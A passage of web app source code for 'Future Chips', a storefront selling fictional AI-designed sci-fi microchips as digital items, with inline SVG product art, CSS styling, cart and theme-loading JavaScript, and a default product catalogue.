cy=\"250\" r=\"160\" stroke-dasharray=\"5 30\" stroke-opacity=\"0.4\" />\n  </g>\n\n  <!-- Magnetic Stabilizers (Hexagonal base layout) -->\n  <g stroke=\"#ffea00\" stroke-width=\"1\" stroke-opacity=\"0.3\" fill=\"none\">\n    <polygon points=\"250,70 405,160 405,340 250,430 95,340 95,160\" />\n  </g>\n\n  <!-- Glowing Sun Core -->\n  <circle cx=\"250\" cy=\"250\" r=\"85\" fill=\"url(#sun-glow)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"45\" fill=\"#ffffff\" filter=\"url(#glow)\" />\n\n  <!-- Magnetic Nodes on Ring -->\n  <g fill=\"#ffea00\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"110\" r=\"6\" />\n    <circle cx=\"250\" cy=\"390\" r=\"6\" />\n    <circle cx=\"110\" cy=\"250\" r=\"6\" />\n    <circle cx=\"390\" cy=\"250\" r=\"6\" />\n  </g>\n  \n  <g fill=\"#ff3300\" filter=\"url(#glow)\">\n    <circle cx=\"151\" cy=\"151\" r=\"4\" />\n    <circle cx=\"349\" cy=\"151\" r=\"4\" />\n    <circle cx=\"151\" cy=\"349\" r=\"4\" />\n    <circle cx=\"349\" cy=\"349\" r=\"4\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#ffea00\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">PHOTON POWER CORE</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">SUB-ATOMIC RADIATION STABILIZER // CLASS-5</text>\n</svg>\n","placeholder.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#141419\" />\n      <stop offset=\"100%\" stop-color=\"#050507\" />\n    </radialGradient>\n    <linearGradient id=\"placeholder-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#888888\" />\n      <stop offset=\"100%\" stop-color=\"#333333\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"5\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <g stroke=\"#ffffff\" stroke-opacity=\"0.02\" stroke-width=\"1\">\n    <path d=\"M 0,50 L 500,50 M 0,100 L 500,100 M 0,150 L 500,150 M 0,200 L 500,200 M 0,250 L 500,250 M 0,300 L 500,300 M 0,350 L 500,350 M 0,400 L 500,400 M 0,450 L 500,450\" />\n    <path d=\"M 50,0 L 50,500 M 100,0 L 100,500 M 150,0 L 150,500 M 200,0 L 200,500 M 250,0 L 250,500 M 300,0 L 300,500 M 350,0 L 350,500 M 400,0 L 400,500 M 450,0 L 450,500\" />\n  </g>\n\n  <!-- Chip Outline -->\n  <rect x=\"150\" y=\"150\" width=\"200\" height=\"200\" rx=\"10\" fill=\"#0d0d12\" stroke=\"url(#placeholder-grad)\" stroke-width=\"2\" />\n  \n  <!-- Outer golden pins -->\n  <g stroke=\"url(#placeholder-grad)\" stroke-width=\"3\">\n    <line x1=\"250\" y1=\"120\" x2=\"250\" y2=\"150\" />\n    <line x1=\"250\" y1=\"350\" x2=\"250\" y2=\"380\" />\n    <line x1=\"120\" y1=\"250\" x2=\"150\" y2=\"250\" />\n    <line x1=\"350\" y1=\"250\" x2=\"380\" y2=\"250\" />\n    \n    <line x1=\"200\" y1=\"120\" x2=\"200\" y2=\"150\" />\n    <line x1=\"300\" y1=\"120\" x2=\"300\" y2=\"150\" />\n    <line x1=\"200\" y1=\"350\" x2=\"200\" y2=\"380\" />\n    <line x1=\"300\" y1=\"350\" x2=\"300\" y2=\"380\" />\n    \n    <line x1=\"120\" y1=\"200\" x2=\"150\" y2=\"200\" />\n    <line x1=\"120\" y1=\"300\" x2=\"150\" y2=\"300\" />\n    <line x1=\"350\" y1=\"200\" x2=\"380\" y2=\"200\" />\n    <line x1=\"350\" y1=\"300\" x2=\"380\" y2=\"300\" />\n  </g>\n\n  <!-- Cybernetic Question Mark / Digital Placeholder -->\n  <text x=\"250\" y=\"275\" text-anchor=\"middle\" fill=\"#888888\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"72\" filter=\"url(#glow)\">?</text>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#888888\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"14\" letter-spacing=\"4\">NO IMAGE UPLOADED</text>\n</svg>\n","quantum_core.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#14192b\" />\n      <stop offset=\"100%\" stop-color=\"#05060a\" />\n    </radialGradient>\n    <linearGradient id=\"quantum-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#ff00e5\" />\n      <stop offset=\"50%\" stop-color=\"#00f0ff\" />\n      <stop offset=\"100%\" stop-color=\"#7000ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"6\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Grid -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.02\" stroke-width=\"1\">\n    <circle cx=\"250\" cy=\"250\" r=\"50\" fill=\"none\" />\n    <circle cx=\"250\" cy=\"250\" r=\"100\" fill=\"none\" />\n    <circle cx=\"250\" cy=\"250\" r=\"150\" fill=\"none\" />\n    <circle cx=\"250\" cy=\"250\" r=\"200\" fill=\"none\" />\n    <line x1=\"50\" y1=\"250\" x2=\"450\" y2=\"250\" />\n    <line x1=\"250\" y1=\"50\" x2=\"250\" y2=\"450\" />\n    <line x1=\"108\" y1=\"108\" x2=\"392\" y2=\"392\" />\n    <line x1=\"108\" y1=\"392\" x2=\"392\" y2=\"108\" />\n  </g>\n\n  <!-- Quantum Entanglement Lines -->\n  <g stroke=\"url(#quantum-grad)\" stroke-width=\"1.5\" stroke-opacity=\"0.4\" fill=\"none\">\n    <path d=\"M 250,250 C 200,150 150,200 150,250 S 200,350 250,250\" />\n    <path d=\"M 250,250 C 300,150 350,200 350,250 S 300,350 250,250\" />\n    <path d=\"M 250,250 C 150,200 200,150 250,150 S 350,200 250,250\" />\n    <path d=\"M 250,250 C 150,300 200,350 250,350 S 350,300 250,250\" />\n  </g>\n  \n  <!-- Outer Ring -->\n  <rect x=\"100\" y=\"100\" width=\"300\" height=\"300\" rx=\"20\" stroke=\"url(#quantum-grad)\" stroke-width=\"2\" stroke-dasharray=\"20 15\" fill=\"none\" filter=\"url(#glow)\" />\n  <rect x=\"115\" y=\"115\" width=\"270\" height=\"270\" rx=\"10\" stroke=\"#00f0ff\" stroke-opacity=\"0.2\" stroke-width=\"1\" fill=\"none\" />\n\n  <!-- Central Processor Die -->\n  <rect x=\"175\" y=\"175\" width=\"150\" height=\"150\" rx=\"8\" fill=\"#0b0e17\" stroke=\"url(#quantum-grad)\" stroke-width=\"2\" />\n  \n  <!-- Inner glowing core -->\n  <circle cx=\"250\" cy=\"250\" r=\"40\" fill=\"url(#quantum-grad)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"25\" fill=\"#05060a\" />\n\n  <!-- Qubits (Nodes) -->\n  <g fill=\"#00f0ff\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"140\" r=\"6\" />\n    <circle cx=\"250\" cy=\"360\" r=\"6\" />\n    <circle cx=\"140\" cy=\"250\" r=\"6\" />\n    <circle cx=\"360\" cy=\"250\" r=\"6\" />\n  </g>\n  \n  <g fill=\"#ff00e5\" filter=\"url(#glow)\">\n    <circle cx=\"172\" cy=\"172\" r=\"5\" />\n    <circle cx=\"328\" cy=\"172\" r=\"5\" />\n    <circle cx=\"172\" cy=\"328\" r=\"5\" />\n    <circle cx=\"328\" cy=\"328\" r=\"5\" />\n  </g>\n\n  <!-- Connectors -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.3\" stroke-width=\"1\">\n    <line x1=\"250\" y1=\"140\" x2=\"250\" y2=\"175\" />\n    <line x1=\"250\" y1=\"360\" x2=\"250\" y2=\"325\" />\n    <line x1=\"140\" y1=\"250\" x2=\"175\" y2=\"250\" />\n    <line x1=\"360\" y1=\"250\" x2=\"325\" y2=\"250\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#ff00e5\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">QUANTUM NEURAL CORE</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">1024 LOGICAL QUBITS // MODEL Q-1</text>\n</svg>\n"};
const STOREFRONT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Future Chips — Next-Gen AI Microprocessors & Quantum Cores</title>
  <meta name="description" content="Explore and purchase premium digital microchips and quantum computing modules, synthesized in real-time by next-generation AI models. Priced $10 to $100,000 USD.">
  
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');

:root {
  /* Dynamic themes, fallback values */
  --primary-color: #00f0ff;
  --accent-color: #ff00e5;
  --background-color: #0a0a1a;
  --card-bg: rgba(16, 16, 36, 0.6);
  --text-color: #ffffff;
  --text-muted: #8c8cbe;
  
  --font-title: 'Outfit', sans-serif;
  --font-body: 'Inter', sans-serif;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background-color: var(--background-color);
  color: var(--text-color);
  font-family: var(--font-body);
  line-height: 1.6;
  overflow-x: hidden;
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
  background-attachment: fixed;
}

/* Glassmorphism utility */
.glass {
  background: var(--card-bg);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.container {
  width: 90%;
  max-width: 1200px;
  margin: 0 auto;
}

/* Header */
header {
  position: sticky;
  top: 0;
  z-index: 100;
  padding: 1.5rem 0;
  transition: background 0.3s;
}

header.scrolled {
  background: rgba(10, 10, 26, 0.85);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

header .nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.8rem;
  letter-spacing: 2px;
  color: #ffffff;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.logo span {
  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
}

.nav-links {
  display: flex;
  gap: 2rem;
  list-style: none;
}

.nav-links a {
  color: var(--text-muted);
  text-decoration: none;
  font-weight: 500;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #ffffff;
}

.cart-icon-btn {
  background: none;
  border: none;
  color: #ffffff;
  cursor: pointer;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 45px;
  height: 45px;
  border-radius: 50%;
  transition: background 0.3s;
}

.cart-icon-btn:hover {
  background: rgba(255, 255, 255, 0.05);
}

.cart-icon-btn svg {
  width: 22px;
  height: 22px;
  fill: currentColor;
}

.cart-badge {
  position: absolute;
  top: 5px;
  right: 5px;
  background: var(--accent-color);
  color: #ffffff;
  font-size: 0.75rem;
  font-weight: bold;
  padding: 2px 6px;
  border-radius: 10px;
  box-shadow: 0 0 10px var(--accent-color);
}

/* Hero Section */
.hero {
  padding: 6rem 0 4rem 0;
  text-align: center;
  position: relative;
}

.hero h1 {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 4rem;
  line-height: 1.1;
  margin-bottom: 1rem;
  letter-spacing: -1px;
}

.hero h1 span {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  display: inline-block;
  animation: glow-pulse 3s infinite alternate;
}

.hero p {
  color: var(--text-muted);
  font-size: 1.2rem;
  max-width: 600px;
  margin: 0 auto 2.5rem auto;
}

/* Search and Filters */
.filters-section {
  margin-bottom: 3rem;
  padding: 1.5rem;
  border-radius: 16px;
}

.filters-wrapper {
  display: flex;
  gap: 1.5rem;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
}

.search-box {
  flex: 1;
  min-width: 280px;
  position: relative;
}

.search-box input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1rem 0.8rem 2.8rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.search-box input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

.search-box svg {
  position: absolute;
  left: 1rem;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  fill: var(--text-muted);
}

.filter-group {
  display: flex;
  gap: 1rem;
  align-items: center;
}

.filter-group select {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1.5rem;
  color: #ffffff;
  cursor: pointer;
  outline: none;
  font-family: var(--font-body);
  transition: border-color 0.3s;
}

.filter-group select:focus {
  border-color: var(--primary-color);
}

/* Product Grid */
.products-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 2.5rem;
  margin-bottom: 5rem;
}

/* Product Card */
.product-card {
  border-radius: 20px;
  overflow: hidden;
  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
  display: flex;
  flex-direction: column;
  height: 100%;
}

.product-card:hover {
  transform: translateY(-8px);
  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
  border-color: rgba(0, 240, 255, 0.3);
}

.product-image-wrap {
  width: 100%;
  aspect-ratio: 1;
  position: relative;
  background: #000;
  display: flex;
  align-items: center;
  justify-content: center;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.product-image-wrap img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transition: transform 0.5s ease;
}

.product-card:hover .product-image-wrap img {
  transform: scale(1.05);
}

.product-info {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  flex-grow: 1;
}

.product-category {
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 2px;
  color: var(--primary-color);
  margin-bottom: 0.5rem;
  font-weight: 700;
}

.product-title {
  font-family: var(--font-title);
  font-size: 1.4rem;
  font-weight: 700;
  margin-bottom: 0.5rem;
  line-height: 1.3;
}

.product-desc {
  color: var(--text-muted);
  font-size: 0.9rem;
  margin-bottom: 1.5rem;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-grow: 1;
}

.product-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.product-price {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.5rem;
  color: #ffffff;
}

.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  padding: 0.8rem 1.5rem;
  border-radius: 10px;
  font-weight: 600;
  font-family: var(--font-body);
  text-decoration: none;
  cursor: pointer;
  transition: all 0.3s;
  border: none;
}

.btn-primary {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  color: #ffffff;
  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
}

.btn-primary:hover {
  transform: scale(1.03);
  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
}

.btn-outline {
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.2);
  color: #ffffff;
}

.btn-outline:hover {
  border-color: var(--primary-color);
  background: rgba(0, 240, 255, 0.05);
}

/* Detail View Layout */
.product-detail-layout {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 4rem;
  padding: 5rem 0;
  align-items: center;
}

@media (max-width: 768px) {
  .product-detail-layout {
    grid-template-columns: 1fr;
    gap: 2rem;
    padding: 2rem 0;
  }
  .hero h1 {
    font-size: 2.5rem;
  }
}

.detail-img-card {
  border-radius: 24px;
  overflow: hidden;
  aspect-ratio: 1;
}

.detail-img-card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.detail-info {
  display: flex;
  flex-direction: column;
}

.detail-price-box {
  margin: 1.5rem 0 2.5rem 0;
}

.detail-price-label {
  font-size: 0.85rem;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.detail-price-val {
  font-family: var(--font-title);
  font-size: 3rem;
  font-weight: 900;
  line-height: 1.1;
  color: #ffffff;
}

.detail-checkout-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.form-group {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.form-group label {
  font-size: 0.9rem;
  color: var(--text-muted);
}

.form-group input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.9rem 1rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.form-group input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

/* Slide-over Cart Panel */
.cart-panel {
  position: fixed;
  top: 0;
  right: -450px;
  width: 100%;
  max-width: 420px;
  height: 100%;
  z-index: 1000;
  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
  display: flex;
  flex-direction: column;
  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
}

.cart-panel.active {
  right: 0;
}

.cart-header {
  padding: 1.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.cart-header h2 {
  font-family: var(--font-title);
  font-size: 1.5rem;
}

.cart-close-btn {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  font-size: 1.5rem;
}

.cart-items {
  flex-grow: 1;
  overflow-y: auto;
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.cart-item {
  display: flex;
  gap: 1rem;
  align-items: center;
  padding-bottom: 1.5rem;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}

.cart-item img {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  object-fit: cover;
  background: #000;
}

.cart-item-details {
  flex-grow: 1;
}

.cart-item-title {
  font-weight: 600;
  font-size: 0.95rem;
  margin-bottom: 0.2rem;
}

.cart-item-price {
  color: var(--primary-color);
  font-weight: 700;
  font-size: 0.9rem;
}

.cart-item-remove {
  background: none;
  border: none;
  color: var(--accent-color);
  cursor: pointer;
  font-size: 0.8rem;
  padding: 4px;
}

.cart-footer {
  padding: 1.5rem;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  background: rgba(8, 8, 20, 0.9);
}

.cart-total {
  display: flex;
  justify-content: space-between;
  font-size: 1.2rem;
  font-weight: bold;
  margin-bottom: 1.5rem;
}

.cart-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  z-index: 999;
  display: none;
}

.cart-overlay.active {
  display: block;
}

/* Status / Confirmation page layout */
.status-card {
  max-width: 550px;
  margin: 8rem auto;
  padding: 3rem;
  border-radius: 24px;
  text-align: center;
}

.status-icon {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 2rem auto;
}

.status-icon.success {
  background: #ffffff;
  color: #22c55e; /* Vibrant success green */
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
  border: none;
}

.status-icon.success svg {
  width: 40px;
  height: 40px;
  fill: currentColor;
}

.status-title {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 2.2rem;
  margin-bottom: 1rem;
}

.status-text {
  color: var(--text-muted);
  margin-bottom: 2.5rem;
}

.receipt-info {
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid rgba(255, 255, 255, 0.05);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: left;
  margin-bottom: 2.5rem;
}

.receipt-row {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.8rem;
  font-size: 0.95rem;
}

.receipt-row:last-child {
  margin-bottom: 0;
  padding-top: 0.8rem;
  border-top: 1px solid rgba(255,255,255,0.05);
  font-weight: bold;
}

/* Animations */
@keyframes glow-pulse {
  from {
    filter: drop-shadow(0 0 5px var(--primary-color));
  }
  to {
    filter: drop-shadow(0 0 20px var(--accent-color));
  }
}

/* Footer styling */
footer {
  padding: 3rem 0;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  text-align: center;
  color: var(--text-muted);
  font-size: 0.9rem;
}

</style>
</head>
<body>

  <!-- Header -->
  <header id="main-header" class="glass">
    <div class="container nav-container">
      <a href="/" class="logo">
        <span>⚡</span> <span id="site-title-logo">Future Chips</span>
      </a>
      <ul class="nav-links">
        <li><a href="/">Store</a></li>
      </ul>
      <button class="cart-icon-btn" id="open-cart-btn" aria-label="Open shopping cart">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
        </svg>
        <span class="cart-badge" id="cart-badge-count">0</span>
      </button>
    </div>
  </header>

  <!-- Hero Section -->
  <section class="hero container">
    <h1>Products Designed by <br><span>Live AI Synthesis</span></h1>
    <p>Premium digital microprocessors, synaptic nodes, and quantum cores synthesized dynamically in real-time by cutting-edge neural intelligence architectures.</p>
  </section>

  <!-- Search & Filters -->
  <section class="container">
    <div class="filters-section glass">
      <div class="filters-wrapper">
        <div class="search-box">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
          </svg>
          <input type="text" id="search-input" placeholder="Search digital products...">
        </div>
        <div class="filter-group">
          <select id="category-filter">
            <option value="">All Categories</option>
            <option value="Processors">Processors</option>
            <option value="Interfaces">Interfaces</option>
            <option value="Displays">Displays</option>
            <option value="Energy">Energy</option>
          </select>
          <select id="price-sort">
            <option value="asc">Price: Low to High</option>
            <option value="desc">Price: High to Low</option>
          </select>
        </div>
      </div>
    </div>
  </section>

  <!-- Main Store Products -->
  <main class="container">
    <div class="products-grid" id="products-container">
      <!-- Loading Placeholder / Dynamically injected card items -->
      <div style="grid-column: 1/-1; text-align: center; padding: 3rem; color: var(--text-muted);">
        Loading quantum catalog...
      </div>
    </div>
  </main>

  <!-- Footer -->
  <footer class="container">
    <p>&copy; 2026 <span id="site-footer-name">Future Chips</span>. Synthesized dynamically via our neural hardware network. All Rights Reserved.</p>
  </footer>

  <!-- Slide-over Shopping Cart -->
  <div class="cart-overlay" id="cart-overlay"></div>
  <div class="cart-panel glass" id="cart-panel">
    <div class="cart-header">
      <h2>Your Cart</h2>
      <button class="cart-close-btn" id="close-cart-btn">&times;</button>
    </div>
    <div class="cart-items" id="cart-items-container">
      <!-- Injected cart items -->
      <div style="text-align: center; color: var(--text-muted); margin-top: 5rem;">
        Your cart is empty.
      </div>
    </div>
    <div class="cart-footer">
      <div class="cart-total">
        <span>Total:</span>
        <span id="cart-total-value">$0.00</span>
      </div>
      <button class="btn btn-primary" id="checkout-btn" style="width: 100%;">Procure Modules</button>
    </div>
  </div>

  
<script>

// Global Storefront JavaScript

let cart = JSON.parse(localStorage.getItem('future_chips_cart')) || [];

document.addEventListener('DOMContentLoaded', async () => {
  // Load site details and theme settings
  await loadSiteTheme();
  
  // Set up header scroll effect
  const header = document.getElementById('main-header');
  if (header) {
    window.addEventListener('scroll', () => {
      if (window.scrollY > 50) {
        header.classList.add('scrolled');
      } else {
        header.classList.remove('scrolled');
      }
    });
  }

  // Load products list if on the storefront page
  const productsContainer = document.getElementById('products-container');
  if (productsContainer) {
    await fetchProducts();
    setupFilters();
  }

  // Set up cart triggers
  setupCart();
});

// Load Site Settings (Theme & Site Name)
async function loadSiteTheme() {
  try {
    const res = await fetch('/api/admin/settings');
    if (!res.ok) throw new Error();
    const settings = await res.json();
    
    if (settings) {
      if (settings.primary_color) {
        document.documentElement.style.setProperty('--primary-color', settings.primary_color);
      }
      if (settings.accent_color) {
        document.documentElement.style.setProperty('--accent-color', settings.accent_color);
      }
      if (settings.background_color) {
        document.documentElement.style.setProperty('--background-color', settings.background_color);
      }

      const siteLogos = document.querySelectorAll('#site-title-logo');
      siteLogos.forEach(el => el.innerText = settings.site_name || 'Future Chips');
      
      const siteFooters = document.querySelectorAll('#site-footer-name');
      siteFooters.forEach(el => el.innerText = settings.site_name || 'Future Chips');
      
      if (document.title.includes('Future Chips') && settings.site_name) {
        document.title = document.title.replace('Future Chips', settings.site_name);
      }
      return;
    }
  } catch (err) {
    console.warn('Failed to load dynamic site theme, reading saved local settings:', err);
    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
    if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
    if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
    if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
    if (saved.site_name) {
      const siteLogos = document.querySelectorAll('#site-title-logo');
      siteLogos.forEach(el => el.innerText = saved.site_name);
      const siteFooters = document.querySelectorAll('#site-footer-name');
      siteFooters.forEach(el => el.innerText = saved.site_name);
    }
  }
}

const DEFAULT_PRODUCTS = [
  {
    id: 'prod-nano-chip',
    name: 'Nano-Constructor Unit',
    description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
    price: 10.00,
    image: '/uploads/nano_constructor.svg',
    category: 'Processors'
  },
  {
    id: 'prod-quantum-core',
    name: 'Quantum Neural Core',
    description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
    price: 150.00,
    image: '/uploads/quantum_core.svg',
    category: 'Processors'
  },
  {
    id: 'prod-bio-synapse',
    name: 'Bio-Digital Synapse v4.2',
    description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
    price: 850.00,
    image: '/uploads/bio_synapse.svg',
    category: 'Interfaces'
  },
  {
    id: 'prod-holo-matrix',
    name: 'Holographic Display Matrix',
    description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
    price: 1200.00,
    image: '/uploads/holo_matrix.svg',
    category: 'Displays'
  },
  {
    id: 'prod-photon-core',
    name: 'Photon Power Core',
    description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
    price: 5000.00,
    image: '/uploads/photon_core.svg',
    category: 'Energy'
  },
  {
    id: 'prod-gravitational-grid',
    name: 'Gravitational Grid Controller',
    description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
    price: 98000.00,
    image: '/uploads/gravitational_grid.svg',
    category: 'Energy'
  }
];

